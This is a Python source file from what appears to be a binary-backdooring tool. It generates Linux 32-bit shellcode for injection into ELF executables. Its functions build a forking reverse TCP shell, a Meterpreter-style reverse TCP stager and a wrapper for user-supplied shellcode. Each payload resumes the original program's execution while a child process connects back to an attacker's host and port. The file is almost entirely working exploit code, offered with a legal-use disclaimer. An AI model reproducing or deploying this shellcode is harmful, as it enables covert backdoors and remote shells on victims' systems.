'''
    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    
    Copyright (C) 2013,2014, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.
'''

import struct
import sys

class linux_elfI32_shellcode():
    """
    Linux ELFIntel x32 shellcode class
    """

    def __init__(self, HOST, PORT, e_entry, SUPPLIED_SHELLCODE=None):
        #could take this out HOST/PORT and put into each shellcode function
        self.HOST = HOST
        self.PORT = PORT
        self.e_entry = e_entry
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.shellcode = ""
        self.stackpreserve = "\x90\x90\x60\x9c"
        self.stackrestore = "\x9d\x61"


    def pack_ip_addresses(self):
        hostocts = []
        if self.HOST is None:
            print "This shellcode requires a HOST parameter -H"
            sys.exit(1)
        for i, octet in enumerate(self.HOST.split('.')):
                hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip

    def returnshellcode(self):
        return self.shellcode

    def reverse_shell_tcp(self, CavesPicked={}):
        """
        Modified metasploit linux/x64/shell_reverse_tcp shellcode
        to correctly fork the shellcode payload and contiue normal execution.
        """
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)
       
       
        self.shellcode1 = "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
        #will need to put resume execution shellcode here
        self.shellcode1 += "\xbd"
        self.shellcode1 += struct.pack("<I", self.e_entry)
        self.shellcode1 += "\xff\xe5"
        self.shellcode1 += ("\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
        "\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68")
        #HOST
        self.shellcode1 += self.pack_ip_addresses()
        self.shellcode1 += "\x68\x02\x00"
        #PORT
        self.shellcode1 += struct.pack('!H', self.PORT)
        self.shellcode1 += ("\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
        "\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
        "\x52\x53\x89\xe1\xb0\x0b\xcd\x80")

        self.shellcode = self.shellcode1
        return (self.shellcode1)

    def reverse_tcp_stager(self, CavesPicked={}):
        """
        FOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER
        Modified metasploit linux/x64/shell/reverse_tcp shellcode
        to correctly fork the shellcode payload and contiue normal execution.
        """
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)

        self.shellcode1 = "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
        #will need to put resume execution shellcode here
        self.shellcode1 += "\xbd"
        self.shellcode1 += struct.pack("<I", self.e_entry)
        self.shellcode1 += "\xff\xe5"
        self.shellcode1 += ("\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89\xe1\xcd\x80"
        "\x97\x5b\x68")
        #HOST
        self.shellcode1 += self.pack_ip_addresses()
        self.shellcode1 += "\x68\x02\x00"
        #PORT
        self.shellcode1 += struct.pack('!H', self.PORT)
        self.shellcode1 += ("\x89\xe1\x6a"
                "\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\xb2\x07\xb9\x00\x10"
                "\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd\x80\x5b"
                "\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80\xff\xe1")

        self.shellcode = self.shellcode1
        return (self.shellcode1)

    def user_supplied_shellcode(self, CavesPicked={}):
        """
        For user with position independent shellcode from the user
        """
        if self.SUPPLIED_SHELLCODE is None:
            print "[!] User must provide shellcode for this module (-U)"
            sys.exit(0)
        else:
            supplied_shellcode =  open(self.SUPPLIED_SHELLCODE, 'r+b').read()


        self.shellcode1 = "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
        #will need to put resume execution shellcode here
        self.shellcode1 += "\xbd"
        self.shellcode1 += struct.pack("<I", self.e_entry)
        self.shellcode1 += "\xff\xe5"
        self.shellcode1 += supplied_shellcode

        self.shellcode = self.shellcode1
        return (self.shellcode1)
